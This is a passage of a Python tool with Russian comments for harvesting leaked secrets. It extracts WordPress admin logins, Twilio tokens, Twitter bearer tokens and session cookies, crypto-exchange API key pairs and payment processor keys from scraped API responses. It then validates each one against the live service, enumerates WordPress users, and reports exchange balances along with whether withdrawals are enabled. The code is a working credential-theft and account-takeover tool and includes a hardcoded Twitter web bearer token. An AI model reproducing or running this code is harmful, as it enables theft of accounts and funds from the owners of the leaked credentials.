                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "mailgun":
            async with session.get(
                "https://api.mailgun.net/v3/domains",
                auth=aiohttp.BasicAuth("api", value),
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    result["status"] = "valid"
                    result["detail"] = "domains ok"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "sendgrid":
            async with session.get(
                "https://api.sendgrid.com/v3/scopes",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    result["status"] = "valid"
                    result["detail"] = "scopes ok"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "npm":
            async with session.get(
                "https://registry.npmjs.org/-/user/org.couchdb.user:me",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = str(data.get("name", "?"))
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "dropbox":
            # POST, но строго read-only (get_current_account)
            async with session.post(
                "https://api.dropboxapi.com/2/users/get_current_account",
                headers={"Authorization": f"Bearer {value}"},
                json=None,
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = str(data.get("email", "?"))
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        else:
            result["detail"] = f"unknown kind {kind}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# WordPress finder: админ-креды сайтов (wp_user/wp_password) в API-ответах.
# Пример утечки: GET /api/sites -> [{id,name,url,wp_user,wp_password,...}]
# Верификация read-only: GET {site}/wp-json/wp/v2/users/me, Basic auth.
# ---------------------------------------------------------------------------
WP_PAIR_RE = re.compile(
    r'"wp_user(?:name)?"\s*:\s*"([^"]{1,80})"[^{}]{0,300}?"(?:wp_password|wp_pass)"\s*:\s*"([^"]{4,})"', re.I)
WP_SITE_ENTRY_RE = re.compile(
    r'"(?:url|site_url|domain)"\s*:\s*"([^"]{1,200})"[^{}]{0,400}?"wp_user(?:name)?"\s*:\s*"([^"]{1,80})"'
    r'[^{}]{0,300}?"(?:wp_password|wp_pass)"\s*:\s*"([^"]{4,})"', re.I)


def extract_wp_creds(text: str, fallback_url: str = "") -> list[dict[str, str]]:
    """Пары (site_url, user, password) WordPress из JSON-подобного текста.

    Сначала adjacency url->wp_user->wp_password, затем пары без url
    (fallback_url = хост, на котором найдено тело).
    """
    out: list[dict[str, str]] = []
    seen: set[tuple[str, str, str]] = set()
    for site_url, user, pwd in WP_SITE_ENTRY_RE.findall(text):
        sig = (site_url, user, pwd)
        if sig not in seen:
            seen.add(sig)
            out.append({"site_url": site_url, "user": user, "password": pwd})
    for user, pwd in WP_PAIR_RE.findall(text):
        sig = (fallback_url, user, pwd)
        if sig not in seen and not any(
            s[1] == user and s[2] == pwd for s in seen
        ):
            seen.add(sig)
            out.append({"site_url": fallback_url, "user": user, "password": pwd})
    return out


async def verify_wp_creds(session: aiohttp.ClientSession, site_url: str,
                          user: str, password: str, proxy: str | None = None,
                          timeout_s: float = 8.0) -> dict[str, Any]:
    """WordPress REST: GET /wp-json/wp/v2/users/me, Basic user:password (read-only).

    context=edit даёт roles/capabilities (administrator = полный контроль).
    """
    result: dict[str, Any] = {
        "site": site_url, "user": user, "status": "error", "detail": "",
    }
    auth = base64.b64encode(f"{user}:{password}".encode()).decode()
    try:
        async with session.get(
            site_url.rstrip("/") + "/wp-json/wp/v2/users/me?context=edit",
            headers={
                "Authorization": f"Basic {auth}",
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (compatible; scanner)",
            },
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                if isinstance(data, dict) and data.get("id"):
                    roles = ", ".join(data.get("roles") or []) or "?"
                    result["status"] = "valid"
                    result["roles"] = data.get("roles") or []
                    result["detail"] = (
                        f"WP {site_url} — {data.get('name') or data.get('slug') or '?'} "
                        f"roles={roles}"
                    )
                else:
                    result["detail"] = "no user context"
            elif resp.status in (401, 403):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


async def probe_wp_sites(session: aiohttp.ClientSession, base_url: str,
                         proxy: str | None = None,
                         timeout_s: float = 8.0) -> list[dict[str, str]]:
    """Активный пробер: GET /api/sites — админ-панель отдаёт все сайты сразу."""
    out: list[dict[str, str]] = []
    try:
        async with session.get(
            base_url.rstrip("/") + "/api/sites",
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status != 200 or "json" not in (resp.headers.get("content-type") or ""):
                return out
            data = await resp.json(content_type=None)
            if not isinstance(data, list):
                return out
            for entry in data:
                if not isinstance(entry, dict):
                    continue
                user = entry.get("wp_user") or entry.get("wp_username")
                pwd = entry.get("wp_password") or entry.get("wp_pass")
                if user and pwd:
                    out.append({
                        "site_url": entry.get("url") or "",
                        "user": str(user),
                        "password": str(pwd),
                    })
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError):
        return out
    return out


# Активная проба WordPress: хост сам может быть WP-админкой.
# Только read-only GET, короткий таймаут, без брутфорса.
WP_LOGIN_MARKERS = ("wp-admin", "wp-content", "user_pass", "wp-submit")


async def probe_wp_admin(session: aiohttp.ClientSession, base_url: str,
                         proxy: str | None = None,
                         timeout_s: float = 8.0) -> dict[str, Any]:
    """Проба WP-админки на самом хосте.

    1) GET /wp-login.php - форма логина (маркеры wp-admin/wp-content).
    2) GET /wp-json/wp/v2/users - unauth-перечисление пользователей REST
       (классика: раскрывает логины, часто админские).
    """
    result: dict[str, Any] = {
        "probe": "wp_admin", "login": False, "users_enum": False,
        "users": "", "detail": "",
    }
    headers = {"User-Agent": "Mozilla/5.0 (compatible; scanner)"}
    try:
        async with session.get(
            base_url.rstrip("/") + "/wp-login.php",
            headers=headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=timeout_s),
            allow_redirects=True,
        ) as resp:
            if resp.status == 200:
                text = await resp.text()
                if any(m in text.lower() for m in WP_LOGIN_MARKERS):
                    result["login"] = True
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
        return result
    try:
        async with session.get(
            base_url.rstrip("/") + "/wp-json/wp/v2/users?per_page=10",
            headers={**headers, "Accept": "application/json"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                if isinstance(data, list) and data:
                    names = [
                        str(u.get("slug") or u.get("name") or "")
                        for u in data if isinstance(u, dict)
                    ]
                    names = [n for n in names if n]
                    if names:
                        result["users_enum"] = True
                        result["users"] = ", ".join(names)[:300]
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError):
        pass
    return result


# ---------------------------------------------------------------------------
# Интеграции панелей: service_type + api_key (+ config-эндпоинты).
# Пример: /api/integrations -> [{name, service_type: "traffic_source",
# api_key: "...", config: {balance_endpoint, auth_type: "bearer"}}]
# Верификация read-only GET по известному сервису.
# ---------------------------------------------------------------------------
INTEGRATION_ENDPOINTS: dict[str, str] = {
    # service_type: endpoint верификации (read-only)
    "clickadu": "https://ssp.clickadu.com/api/v2/client/balance/",
    "clickadilla": "https://core.clickadilla.com/api/v1/profile",
    "cloudflare": "https://api.cloudflare.com/client/v4/user/tokens/verify",
}


def extract_integrations(text: str) -> list[dict[str, str]]:
    """Интеграционные записи из JSON-подобного тела (dict/список словарей)."""
    out: list[dict[str, str]] = []
    seen: set[tuple[str, str]] = set()
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return out

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            key = str(node.get("api_key") or "")
            stype = str(node.get("service_type") or "")
            if key and (stype or "service_type" in node):
                entry = {
                    "name": str(node.get("name") or ""),
                    "service_type": stype,
                    "api_key": key,
                    "endpoint": "",
                }
                cfg = node.get("config")
                if isinstance(cfg, dict):
                    ep = cfg.get("balance_endpoint") or cfg.get("profile_endpoint") \
                        or cfg.get("statistics_endpoint") or ""
                    if ep:
                        entry["endpoint"] = str(ep)
                sig = (entry["service_type"], entry["api_key"])
                if sig not in seen and key.lower() not in ("", "none"):
                    seen.add(sig)
                    out.append(entry)
            for v in node.values():
                walk(v)
        elif isinstance(node, list):
            for v in node:
                walk(v)

    walk(data)
    return out


async def verify_integration(session: aiohttp.ClientSession, service_type: str,
                             api_key: str, name: str = "", endpoint: str = "",
                             proxy: str | None = None,
                             timeout_s: float = 8.0) -> dict[str, Any]:
    """Read-only Bearer-проба интеграционного токена по известному сервису."""
    result: dict[str, Any] = {
        "service": service_type, "name": name, "key": api_key,
        "status": "unknown", "detail": "",
    }
    ep = endpoint or INTEGRATION_ENDPOINTS.get(service_type.lower(), "")
    if not ep:
        result["status"] = "skipped"
        result["detail"] = "no known check endpoint"
        return result
    try:
        async with session.get(
            ep, headers={"Authorization": f"Bearer {api_key}",
                         "Accept": "application/json"},
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout_s),
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                bals: list[str] = []
                _collect_balances(data, bals)
                _walk_balance_fields(data, bals)
                # валютных пар может не быть (Clickadu/Clickadilla отдают
                # голый balance) - собираем любые "balance" значения
                _walk_balance_fields(data, bals)
                result["status"] = "valid"
                result["detail"] = f"{service_type} — " + \
                    ("; ".join(bals) if bals else f"HTTP 200 (token works)")
                if bals:
                    result["balances"] = bals[:8]
            elif resp.status in (401, 403):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Twilio: пара AccountSid (AC/SK) + AuthToken, HTTP Basic (read-only)
# ---------------------------------------------------------------------------
TWILIO_PAIR_RE = re.compile(
    r'"(?:twilioAccountSid|accountSid|account_sid|twilio_sid)"\s*:\s*"((?:SK|AC)[0-9a-fA-F]{32})"'
    r'[^{}]{0,400}?'
    r'"(?:twilioAuthToken|authToken|auth_token|twilio_auth_token)"\s*:\s*"([A-Za-z0-9]{32})"')
TWILIO_PAIR_RE_R = re.compile(
    r'"(?:twilioAuthToken|authToken|auth_token|twilio_auth_token)"\s*:\s*"([A-Za-z0-9]{32})"'
    r'[^{}]{0,400}?'
    r'"(?:twilioAccountSid|accountSid|account_sid|twilio_sid)"\s*:\s*"((?:SK|AC)[0-9a-fA-F]{32})"')


def extract_twilio_pairs(text: str) -> list[tuple[str, str]]:
    """(sid, token) пары Twilio из JSON-подобного текста."""
    pairs: list[tuple[str, str]] = []
    for m in TWILIO_PAIR_RE.finditer(text):
        if (m.group(1), m.group(2)) not in pairs:
            pairs.append((m.group(1), m.group(2)))
    for m in TWILIO_PAIR_RE_R.finditer(text):
        if (m.group(2), m.group(1)) not in pairs:
            pairs.append((m.group(2), m.group(1)))
    return pairs


async def verify_twilio_pair(session: aiohttp.ClientSession, sid: str,
                             token: str, proxy: str | None = None,
                             timeout_s: float = 5.0) -> dict[str, Any]:
    """Twilio REST API = HTTP Basic sid:token, GET Accounts.json (read-only)."""
    result: dict[str, Any] = {"sid": sid, "status": "unknown", "detail": ""}
    try:
        async with session.get(
            "https://api.twilio.com/2010-04-01/Accounts.json?PageSize=1",
            auth=aiohttp.BasicAuth(sid, token),
            proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                accs = data.get("accounts") or [{}]
                result["status"] = "valid"
                result["detail"] = str(accs[0].get("friendly_name") or accs[0].get("status") or "?")
            elif resp.status == 401:
                result["status"] = "invalid"
                result["detail"] = "HTTP 401"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Twitter/X: app-only bearer токен (контекстное извлечение)
# ---------------------------------------------------------------------------
def extract_twitter_bearers(text: str, limit: int = 2) -> list[str]:
    """Bearer AAAAAAAA… рядом со словом twitter (контекст отсекает base64-мусор)."""
    out: list[str] = []
    for m in re.finditer(r'(?i)twitter', text):
        window = text[max(0, m.start() - 250): m.start() + 350]
        b = re.search(r'\b(A{10}[A-Za-z0-9%]{30,})', window)
        if b and b.group(1).rstrip("%") not in out:
            # % в хвосте — артефакт url-encoding, twitter на нём отдаёт 500
            out.append(b.group(1).rstrip("%"))
        if len(out) >= limit:
            break
    return out


async def verify_twitter_bearer(session: aiohttp.ClientSession, token: str,
                               proxy: str | None = None,
                               timeout_s: float = 5.0) -> dict[str, Any]:
    """GET rate_limit_status работает с app-only bearer, квоту не тратит."""
    result: dict[str, Any] = {"status": "unknown", "detail": ""}
    try:
        async with session.get(
            "https://api.twitter.com/1.1/application/rate_limit_status.json",
            headers={"Authorization": f"Bearer {token}"},
            proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status in (200, 429):  # 429 = токен валиден, лимит исчерпан
                result["status"] = "valid"
                result["detail"] = "app bearer"
            elif resp.status in (400, 401, 403):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Twitter/X: сессия аккаунта (cookies auth_token + ct0) - полный доступ к
# аккаунту, чекер-панели хранят их пачками вместе с username/email/password.
# Проверка read-only: GraphQL UserByScreenName (мёртвая сессия -> 401).
# ---------------------------------------------------------------------------
TW_WEB_BEARER = (
    "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D"
    "1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"
)
TW_USER_BY_SN_URL = "https://x.com/i/api/graphql/Gb-d6r0vxPOADdG62OEBpQ/UserByScreenName"
TW_GQL_FEATURES = {
    "articles_preview_enabled": True,
    "c9s_tweet_anatomy_moderator_badge_enabled": True,
    "communities_web_enable_tweet_community_results_fetch": True,
    "creator_subscriptions_quote_tweet_preview_enabled": False,
    "creator_subscriptions_tweet_preview_api_enabled": True,
    "freedom_of_speech_not_reach_fetch_enabled": True,
    "graphql_is_translatable_rweb_tweet_is_translatable_enabled": True,
    "longform_notetweets_consumption_enabled": True,
    "longform_notetweets_inline_media_enabled": True,
    "longform_notetweets_rich_text_read_enabled": True,
    "responsive_web_edit_tweet_api_enabled": True,
    "responsive_web_enhance_cards_enabled": False,
    "responsive_web_graphql_exclude_directive_enabled": True,
    "responsive_web_graphql_skip_user_profile_image_extensions_enabled": False,
    "responsive_web_graphql_timeline_navigation_enabled": True,
    "responsive_web_twitter_article_tweet_consumption_enabled": True,
    "standardized_nudges_misinfo": True,
    "tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled": True,
    "verified_phone_label_enabled": False,
    "view_counts_everywhere_api_enabled": True,
}

_TW_AT_RE = re.compile(r'"auth_token"\s*:\s*"([0-9a-fA-F]{40})"')
_TW_CT0_RE = re.compile(r'"ct0"\s*:\s*"([0-9a-fA-F]{32,160})"')
_TW_USER_RE = re.compile(r'"(?:username|screen_name|handle)"\s*:\s*"([A-Za-z0-9_]{2,20})"')


def extract_twitter_sessions(text: str, limit: int | None = 3) -> list[dict[str, Any]]:
    """Пары auth_token+ct0 (полные hex-значения) + username из того же объекта.

    limit=None собирает все пары (для подсчёта размера аккаунт-хранилища).
    """
    out: list[dict[str, Any]] = []
    for m in _TW_AT_RE.finditer(text):
        window = text[max(0, m.start() - 300): m.start() + 400]
        cm = _TW_CT0_RE.search(window)
        if not cm:
            continue
        if any(s["auth_token"] == m.group(1) for s in out):
            continue
        um = _TW_USER_RE.search(window)
        out.append({"auth_token": m.group(1), "ct0": cm.group(1),
                    "username": um.group(1) if um else None})
        if limit is not None and len(out) >= limit:
            break
    return out


def _tw_find(obj: Any, key: str) -> Any:
    if isinstance(obj, dict):
        if key in obj:
            return obj[key]
        for v in obj.values():
            r = _tw_find(v, key)
            if r is not None:
                return r
    elif isinstance(obj, list):
        for v in obj:
            r = _tw_find(v, key)
            if r is not None:
                return r
    return None


async def verify_twitter_session(session: aiohttp.ClientSession, auth_token: str,
                                 ct0: str, screen_name: str | None = None,
                                 proxy: str | None = None,
                                 timeout_s: float = 8.0) -> dict[str, Any]:
    """Read-only проверка cookie-сессии Twitter через GraphQL UserByScreenName."""
    result: dict[str, Any] = {"status": "unknown", "screen_name": screen_name,
                              "followers": None, "detail": ""}
    if not screen_name:
        result["detail"] = "нет username рядом с сессией"
        return result
    try:
        params = {"variables": json.dumps({"screen_name": screen_name}),
                  "features": json.dumps(TW_GQL_FEATURES)}
        headers = {
            "Authorization": f"Bearer {TW_WEB_BEARER}",
            "X-CSRF-Token": ct0,
            "x-twitter-auth-type": "OAuth2Cookie",
            "x-twitter-active-user": "yes",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        async with session.get(
            TW_USER_BY_SN_URL, params=params,
            cookies={"auth_token": auth_token, "ct0": ct0},
            headers=headers, proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                core = _tw_find(data, "core") or {}
                followers = _tw_find(data, "followers_count")
                if followers is None:
                    followers = _tw_find(data, "followers")
                result.update(status="valid",
                              screen_name=core.get("screen_name") or screen_name,
                              followers=followers)
                followers = result["followers"]
                result["detail"] = f"@{result['screen_name']}" + \
                    (f", {followers} подписчиков" if followers is not None else "")
            elif resp.status == 429:
                result.update(status="valid", detail="rate limit (сессия жива)")
            elif resp.status in (401, 403, 404):
                result.update(status="invalid", detail=f"HTTP {resp.status}")
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Биржевые API-ключи: binance/bybit/okx/kucoin (HMAC-подпись, read-only:
# баланс + право вывода — связка «сколько денег лежит и можно ли вывести»)
# ---------------------------------------------------------------------------
EXCHANGE_CTX_RE = re.compile(r'(?i)\b(binance|bybit|okx|kucoin)\b')
_EX_KEY_RE = re.compile(
    r'"(?:api[_-]?key|apiKey|api[_-]?id|access[_-]?key|exchange[_-]?key)"\s*:\s*"([A-Za-z0-9]{16,64})"', re.I)
_EX_SECRET_RE = re.compile(
    r'"(?:api[_-]?secret|apiSecret|secret(?:[_-]?key)?)"\s*:\s*"([A-Za-z0-9+/=_-]{16,64})"', re.I)
_EX_PASS_RE = re.compile(r'"(?:passphrase|pass_phrase)"\s*:\s*"([^"]{6,64})"', re.I)


def extract_exchange_pairs(text: str, limit: int = 3) -> list[dict[str, Any]]:
    """Пары api_key+secret (для okx/kucoin + passphrase) рядом с названием биржи."""
    out: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()
    for m in EXCHANGE_CTX_RE.finditer(text):
        window = text[max(0, m.start() - 600): m.start() + 900]
        km = _EX_KEY_RE.search(window)
        sm = _EX_SECRET_RE.search(window)
        if not (km and sm) or km.group(1) == sm.group(1):
            continue
        pm = _EX_PASS_RE.search(window)
        exchange = m.group(1).lower()
        sig = (exchange, km.group(1), sm.group(1))
        if sig in seen:
            continue
        seen.add(sig)
        out.append({"exchange": exchange, "key": km.group(1), "secret": sm.group(1),
                   "passphrase": pm.group(1) if pm else None})
        if len(out) >= limit:
            break
    return out


def _hmac_hex(secret: str, msg: str) -> str:
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()


def _hmac_b64(secret: bytes, msg: str) -> str:
    return base64.b64encode(hmac.new(secret, msg.encode(), hashlib.sha256).digest()).decode()


def _ex_error(status: int) -> dict[str, Any]:
    return {"status": "invalid" if status in (400, 401, 403) else "unknown",
            "detail": f"HTTP {status}", "balances": [], "withdraw_enabled": None}


async def _verify_binance(session: aiohttp.ClientSession, key: str, secret: str,
                          proxy: str | None, timeout_s: float) -> dict[str, Any]:
    headers = {"X-MBX-APIKEY": key}
    q = f"timestamp={int(time.time() * 1000)}&recvWindow=5000"
    async with session.get(
        f"https://api.binance.com/api/v3/account?{q}&signature={_hmac_hex(secret, q)}",
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json()
        balances = [
            f"{b['asset']}={float(b['free'] or 0) + float(b['locked'] or 0):.6g}"
            for b in data.get("balances") or []
            if float(b.get("free") or 0) + float(b.get("locked") or 0) > 0
        ]
    # Права ключа: enableWithdrawals (sapi может быть выключен — не критично)
    q2 = f"timestamp={int(time.time() * 1000)}&recvWindow=5000"
    withdraw: bool | None = None
    try:
        async with session.get(
            f"https://api.binance.com/sapi/v1/account/apiRestrictions?{q2}&signature={_hmac_hex(secret, q2)}",
            headers=headers, proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                withdraw = bool((await resp.json()).get("enableWithdrawals"))
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    detail = ", ".join(balances[:4]) if balances else "баланс 0"
    if withdraw is not None:
        detail += "; вывод: вкл" if withdraw else "; вывод: выкл"
    return {"status": "valid", "balances": balances[:8], "withdraw_enabled": withdraw, "detail": detail}


async def _verify_bybit(session: aiohttp.ClientSession, key: str, secret: str,
                       proxy: str | None, timeout_s: float) -> dict[str, Any]:
    ts = str(int(time.time() * 1000))
    qs = "accountType=UNIFIED"
    sign = _hmac_hex(secret, ts + key + "5000" + qs)
    headers = {"X-BAPI-API-KEY": key, "X-BAPI-TIMESTAMP": ts,
               "X-BAPI-RECV-WINDOW": "5000", "X-BAPI-SIGN": sign}
    async with session.get(
        f"https://api.bybit.com/v5/account/wallet-balance?{qs}",
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json()
        if data.get("retCode") != 0:
            return {"status": "invalid", "detail": f"retCode {data.get('retCode')}",
                    "balances": [], "withdraw_enabled": None}
        coins = []
        for acc in (data.get("result") or {}).get("list") or []:
            for c in acc.get("coin") or []:
                wb = float(c.get("walletBalance") or 0)
                if wb > 0:
                    coins.append(f"{c.get('coin')}={wb:.6g}")
    # Права ключа: /v5/user/query-api (может отсутствовать у старых ключей)
    ts2 = str(int(time.time() * 1000))
    sign2 = _hmac_hex(secret, ts2 + key + "5000")
    headers2 = {"X-BAPI-API-KEY": key, "X-BAPI-TIMESTAMP": ts2,
                "X-BAPI-RECV-WINDOW": "5000", "X-BAPI-SIGN": sign2}
    withdraw: bool | None = None
    try:
        async with session.get(
            "https://api.bybit.com/v5/user/query-api",
            headers=headers2, proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                body = await resp.json(content_type=None)
                perms = str((body.get("result") or {}).get("permissions") or body.get("result") or "")
                if perms:
                    compact = re.sub(r'[\s"]', "", perms)
                    withdraw = "withdraw:true" in compact.lower()
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    detail = ", ".join(coins[:4]) if coins else "баланс 0"
    if withdraw is not None:
        detail += "; вывод: вкл" if withdraw else "; вывод: выкл"
    return {"status": "valid", "balances": coins[:8], "withdraw_enabled": withdraw, "detail": detail}


async def _verify_okx(session: aiohttp.ClientSession, key: str, secret: str,
                      passphrase: str | None, proxy: str | None,
                      timeout_s: float) -> dict[str, Any]:
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    path = "/api/v5/account/balance"
    sign = _hmac_b64(secret.encode(), ts + "GET" + path)
    headers = {"OK-ACCESS-KEY": key, "OK-ACCESS-SIGN": sign,
               "OK-ACCESS-TIMESTAMP": ts, "OK-ACCESS-PASSPHRASE": passphrase or ""}
    async with session.get(
        "https://www.okx.com" + path,
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json()
        if str(data.get("code")) != "0":
            return {"status": "invalid", "detail": f"code {data.get('code')}",
                    "balances": [], "withdraw_enabled": None}
        coins = []
        for d in data.get("data") or []:
            for dt in d.get("details") or []:
                bal = float(dt.get("bal") or 0)
                if bal > 0:
                    coins.append(f"{dt.get('ccy')}={bal:.6g}")
    return {"status": "valid", "balances": coins[:8], "withdraw_enabled": None,
            "detail": ", ".join(coins[:4]) if coins else "баланс 0"}


async def _verify_kucoin(session: aiohttp.ClientSession, key: str, secret: str,
                        passphrase: str | None, proxy: str | None,
                        timeout_s: float) -> dict[str, Any]:
    ts = str(int(time.time() * 1000))
    path = "/api/v1/accounts"
    try:
        sec_bytes = base64.b64decode(secret.encode())
    except (ValueError, TypeError):
        sec_bytes = secret.encode()
    sign = _hmac_b64(sec_bytes, ts + "GET" + path)
    headers = {
        "KC-API-KEY": key, "KC-API-SIGN": sign, "KC-API-TIMESTAMP": ts,
        "KC-API-PASSPHRASE": base64.b64encode((passphrase or "").encode()).decode(),
        "KC-API-KEY-VERSION": "2",
    }
    async with session.get(
        "https://api.kucoin.com" + path,
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json(content_type=None)
        if str(data.get("code")) != "200000":
            return {"status": "invalid", "detail": f"code {data.get('code')}",
                    "balances": [], "withdraw_enabled": None}
        coins = [
            f"{a.get('currency')}={float(a.get('balance') or 0):.6g}"
            for a in data.get("data") or [] if float(a.get("balance") or 0) > 0
        ]
    return {"status": "valid", "balances": coins[:8], "withdraw_enabled": None,
            "detail": ", ".join(coins[:4]) if coins else "баланс 0"}


async def verify_exchange_keypair(session: aiohttp.ClientSession, exchange: str,
                                 key: str, secret: str, passphrase: str | None = None,
                                 proxy: str | None = None,
                                 timeout_s: float = 8.0) -> dict[str, Any]:
    """Read-only проверка ключа биржи: HMAC-подпись, баланс + право вывода."""
    result: dict[str, Any] = {"exchange": exchange, "key": key,
                              "status": "unknown", "detail": "",
                              "balances": [], "withdraw_enabled": None}
    try:
        if exchange == "binance":
            result.update(await _verify_binance(session, key, secret, proxy, timeout_s))
        elif exchange == "bybit":
            result.update(await _verify_bybit(session, key, secret, proxy, timeout_s))
        elif exchange == "okx":
            result.update(await _verify_okx(session, key, secret, passphrase, proxy, timeout_s))
        elif exchange == "kucoin":
            result.update(await _verify_kucoin(session, key, secret, passphrase, proxy, timeout_s))
        else:
            result["detail"] = f"unknown exchange {exchange}"
    except (aiohttp.ClientError, TimeoutError, OSError, ValueError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Крипто-платёжные процессоры с выплатами (heleket, cryptomus, nowpayments,
# plisio): API-ключ = приём платежей + выплаты, проверяем баланс (read-only)
# ---------------------------------------------------------------------------
# (?![a-z0-9]) вместо \b: допускаем префикс в имени поля (nowpayments_api_key)
CRYPTOPAY_CTX_RE = re.compile(r'(?i)\b(heleket|cryptomus|nowpayments|plisio)(?![a-z0-9])')
_CP_KEY_RE = re.compile(
    r'"(?:[a-z0-9_-]{0,24})?(?:api[_-]?key|apikey|payment[_-]?api[_-]?key|payout[_-]?api[_-]?key|secret[_-]?key)"'
    r'\s*:\s*"([A-Za-z0-9_-]{20,64})"', re.I)
_CP_MERCHANT_RE = re.compile(
    r'"(?:merchant(?:[_-](?:id|uuid))?|merchantId|shop[_-]?id)"\s*:\s*"?'
    r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"?', re.I)


def extract_cryptopay_keys(text: str, limit: int = 3) -> list[dict[str, Any]]:
    """API-ключи крипто-платёжек рядом с названием сервиса (+merchant UUID)."""
    out: list[dict[str, Any]] = []
    seen: set[tuple] = set()
    for m in CRYPTOPAY_CTX_RE.finditer(text):
        service = m.group(1).lower()
        window = text[max(0, m.start() - 600): m.start() + 900]
        km = _CP_KEY_RE.search(window)
        if not km:
            continue
        mm = _CP_MERCHANT_RE.search(window)
        sig = (service, km.group(1), mm.group(1) if mm else None)
        if sig in seen:
            continue
        seen.add(sig)
        out.append({"service": service, "key": km.group(1),
                    "merchant": mm.group(1) if mm else None})
        if len(out) >= limit:
            break
    return out


def _md5_hex(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def _collect_balances(obj: Any, out: list[str]) -> None:
    """Рекурсивно собирает пары валюта=баланс из произвольного JSON ответа."""
    if isinstance(obj, dict):
        cc = obj.get("currency_code") or obj.get("currency") or obj.get("coin")
        bal = obj.get("balance") if obj.get("balance") is not None else obj.get("available_amount")
        if isinstance(cc, str) and bal is not None and float(bal or 0) > 0:
            out.append(f"{cc}={bal}")
        for v in obj.values():
            _collect_balances(v, out)
    elif isinstance(obj, list):
        for v in obj:
            _collect_balances(v, out)


def _walk_balance_fields(obj: Any, out: list[str], depth: int = 0) -> None:
    """Голые 'balance' значения без валюты (Clickadu 371.96, Clickadilla 132.99)."""
    if depth > 6:
        return
    if isinstance(obj, dict):
